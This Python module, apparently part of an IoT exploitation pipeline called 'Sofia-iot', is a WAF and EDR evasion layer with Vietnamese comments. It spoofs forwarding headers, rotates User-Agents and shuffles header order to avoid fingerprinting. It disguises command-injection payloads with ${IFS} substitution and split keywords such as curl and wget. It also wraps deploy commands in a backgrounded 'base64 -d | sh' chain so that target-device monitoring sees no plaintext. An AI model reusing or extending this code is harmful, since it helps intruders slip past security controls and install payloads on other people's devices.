# -*- coding: utf-8 -*-
"""
evasion.py — Lớp né tránh WAF / EDR cho pipeline Sofia-iot.

WAF (phía HTTP server đích):
  * Xoay vòng User-Agent + header giả (X-Forwarded-For, X-Real-IP, ...).
  * Biến thể payload command injection:
      - thay khoảng trắng bằng ${IFS}
      - tách keyword nhạy cảm (curl → cu''rl) để phá signature-based WAF
      - bọc toàn bộ lệnh bằng base64 (echo <b64>|base64 -d|sh) — WAF không
        thấy URL/keyword plaintext trong tham số request.
  * Nhận diện WAF từ response (status 403/406 + header/cookie/body đặc trưng).

EDR (phía thiết bị đích khi deploy):
  * Bọc chuỗi deploy bằng base64 — process list / network sniff chỉ thấy
    printf|base64 -d|sh, không lộ curl/python3/URL dạng plaintext.
  * Tên biến + tên file tạm ngẫu nhiên mỗi lần chạy (đa hình).
"""

import base64
import logging
import random
import re
import string

log = logging.getLogger("sofia.evasion")

# ── Pool User-Agent (nâng cấp P1: refresh 2026 — Chrome 126+/FF 127+, bỏ UA lỗi thời) ─
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "curl/8.7.1",
    "Wget/1.24.5",
]

# ── Dấu hiệu nhận diện WAF qua response ────────────────────────────────
_WAF_SIGNS = [
    ("cloudflare", ("cf-ray", "cf-cache-status", "__cfduid")),
    ("mod_security", ("x-mod-sec", "mod_security", "owasp")),
    ("aws_waf", ("x-amzn-waf", "awswaf", "x-amzn-requestid")),
    ("imperva", ("x-cdn", "incap_ses", "visid_incap")),
    ("sucuri", ("x-sucuri-id", "x-sucuri-cache")),
    ("akamai", ("akamai", "ak_bmsc", "x-akamai")),
    ("f5_bigip", ("x-cnection", "bigip", "f5")) ,
    ("barracuda", ("barracuda", "barra_counter_session")),
    ("incapsula", ("incap_ses", "visid_incap")),
    ("wordfence", ("wordfence", "wfvt_")),
    ("sqreen", ("x-sqreen",)),
    ("aliyun_waf", ("aliyundun", "x-alo-cdn", "waf-verify")),
    ("cloudfront", ("x-amz-cf-id", "cloudfront")),
]
_WAF_STATUS = {403, 406, 429}
_WAF_BODY_RE = re.compile(
    r"(access denied|blocked|challenge|verify you are human|"
    r"security check|waf|firewall|forbidden by|request rejected|"
    r"tamper|attack detected|suspicious activity)", re.I)


def rand_tag(n=8):
    """Chuỗi ngẫu nhiên (chữ thường + số) cho tag/biến đa hình."""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def random_ua(category=None, port=None):
    """
    Chọn 1 User-Agent cho request.

    Ưu tiên cấu hình tập trung ở config (nâng cấp): nếu config.py có
    `pick_user_agent` thì dùng nó — tôn trọng UA_MODE / UA_ROTATE / UA_SEED
    và chọn pool theo `category`/`port` (UA_PORT_POOL). Nếu không (config cũ
    hoặc lỗi import) → fallback pool nội bộ UA_POOL như trước.

    Tham số:
      category — "browser"/"bot"/"client"/"iot" (None = theo cổng/pool chung).
      port     — cổng đích (tra UA_PORT_POOL để chọn UA hợp ngữ cảnh).
    """
    try:
        import config
        pick = getattr(config, "pick_user_agent", None)
        if callable(pick):
            ua = pick(category=category, port=port)
            if ua:
                return ua
    except Exception:  # noqa: BLE001 — thiếu config vẫn chạy như cũ
        pass
    return random.choice(UA_POOL)


# Dải TEST-NET RFC 5737 — IP giả KHÔNG thuộc mạng thật (không gây trùng/hại):
#   192.0.2.0/24 (TEST-NET-1), 198.51.100.0/24 (TEST-NET-2), 203.0.113.0/24 (TEST-NET-3)
# Nâng cấp P1: bỏ random 1..254 (rất dễ trúng RFC1918 thật trên mạng đích
# → WAF/log của đích cảnh báo "XFF nội bộ" hoặc chặn).
_TEST_NETS = [(192, 0, 2), (198, 51, 100), (203, 0, 113)]


def random_ip():
    """IP giả cho header X-Forwarded-For — ngẫu nhiên trong dải TEST-NET RFC 5737."""
    net = random.choice(_TEST_NETS)
    return "%d.%d.%d.%d" % (net[0], net[1], net[2], random.randint(1, 254))


def shuffled_headers(hdrs):
    """
    Xáo thứ tự header (P1 OPSEC) — tránh vân tay HTTP giống hệt mỗi request.
    Host luôn ĐỨNG ĐẦU (bắt buộc với HTTP/1.1; vài server cũ hiểu lầm nếu không).
    Trả về list (key, value) mới — không sửa dict gốc.
    """
    items = list((hdrs or {}).items())
    host_items = [(k, v) for k, v in items if k.lower() == "host"]
    rest = [(k, v) for k, v in items if k.lower() != "host"]
    random.shuffle(rest)
    return host_items + rest


def evasive_headers(base_headers=None, host="", port=80):
    """
    Tạo dict header có WAF-bypass: UA xoay vòng + header chuyển tiếp giả.
    Trả về dict mới (không sửa dict gốc).
    """
    hdrs = dict(base_headers or {})
    hdrs.setdefault("User-Agent", random_ua(port=port))
    hdrs.setdefault("Host", "%s:%s" % (host, port))
    hdrs.setdefault("Accept", random.choice([
        "*/*",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json, text/plain, */*",
    ]))
    hdrs.setdefault("Accept-Language", random.choice([
        "en-US,en;q=0.9", "vi-VN,vi;q=0.8,en;q=0.5", "zh-CN,zh;q=0.9,en;q=0.8",
    ]))
    # Header chuyển tiếp — một số WAF cho qua request có vẻ "đi qua proxy"
    hdrs.setdefault("X-Forwarded-For", random_ip())
    hdrs.setdefault("X-Real-IP", random_ip())
    hdrs.setdefault("X-Originating-IP", random_ip())
    hdrs.setdefault("Connection", "close")
    return hdrs


# ── Biến thể payload né WAF (phía HTTP param) ──────────────────────────
def _split_keywords(s, keywords):
    """Chèn nháy đơn rỗng vào keyword: curl → cu''rl (shell nối chuỗi → curl)."""
    for kw in sorted(keywords, key=len, reverse=True):
        if kw in s:
            s = s.replace(kw, kw[:max(1, len(kw) // 2)] + "''" + kw[max(1, len(kw) // 2):])
    return s


def _spaces_outside_quotes(s, repl="${IFS}"):
    """
    Chỉ thay khoảng trắng NGOÀI single-quote bằng repl.
    Lý do: bên trong '...' của sh -c, ${IFS} là văn bản literal —
    thay ở đó sẽ làm vỡ lệnh. Biến thể này áp dụng cho lớp shell NGOÀI.
    """
    out = []
    in_q = False
    for ch in s:
        if ch == "'":
            in_q = not in_q
            out.append(ch)
        elif ch == " " and not in_q:
            out.append(repl)
        else:
            out.append(ch)
    return "".join(out)


def waf_variant(cmd):
    """
    Biến thể chống WAF signature: thay ' ' bằng ${IFS} (chỉ ngoài single-quote)
    và tách keyword nhạy cảm (curl/wget/unzip/base64/nohup/python3) thành
    chuỗi nối '' — phá signature WAF mà không vỡ lệnh shell.
    """
    s = _spaces_outside_quotes(cmd)
    s = _split_keywords(s, [
        "curl", "wget", "python3", "base64", "unzip", "nohup", "sh", "sudo",
    ])
    return s


def edr_wrap(cmd):
    """
    Bọc lệnh bằng base64 để né EDR/honeypot trên thiết bị đích:
    `nohup sh -c 'e=<b64>; printf %s "$e" | base64 -d | sh' >/dev/null 2>&1 &`
    Process list chỉ thấy printf/base64 — không lộ URL/keyword plaintext.
    """
    b64 = base64.b64encode(cmd.encode("utf-8")).decode("ascii")
    var = rand_tag(6)
    return ("nohup sh -c 'v=%s; printf %%s \"$v\" | base64 -d | sh' "
            ">/dev/null 2>&1 &" % b64)


def deploy_variants(deploy_cmd, edr=True):
    """
    Sinh các biến thể của chuỗi deploy (phần sau `id; echo MARKER_`).
    Luôn có bản gốc; bật EVASION/EDR thì thêm biến thể.
    """
    variants = [deploy_cmd]
    if edr:
        variants.append(edr_wrap(deploy_cmd))
    variants.append(waf_variant(deploy_cmd))
    variants.append(edr_wrap(waf_variant(deploy_cmd)))
    return variants


# ── Nhận diện WAF từ response ──────────────────────────────────────────
def waf_detect(status, headers, body=""):
    """
    Heuristic phát hiện WAF từ response. Trả về (bool, tên WAF hoặc "").
    Dấu hiệu: status đặc trưng, header/cookie WAF, chuỗi body chặn.
    """
    hdr_keys = " ".join((headers or {}).keys()).lower()
    hdr_vals = " ".join(str(v).lower() for v in (headers or {}).values())
    blob = hdr_keys + " " + hdr_vals
    for name, sigs in _WAF_SIGNS:
        for sig in sigs:
            if sig.lower() in blob:
                return True, name
    if status in _WAF_STATUS:
        body_low = (body or "").lower()
        if _WAF_BODY_RE.search(body_low) or status == 429:
            return True, "status_%d" % status
    return False, ""


def waf_evidence(waf_name, attempts):
    """Chuỗi evidence phụ khi nghi WAF chặn."""
    if not waf_name:
        return ""
    return "WAF detect: %s (sau %d lần thử)" % (waf_name, attempts)


__all__ = [
    "rand_tag", "random_ua", "random_ip", "evasive_headers",
    "shuffled_headers",
    "waf_variant", "edr_wrap", "deploy_variants", "waf_detect",
    "waf_evidence",
]



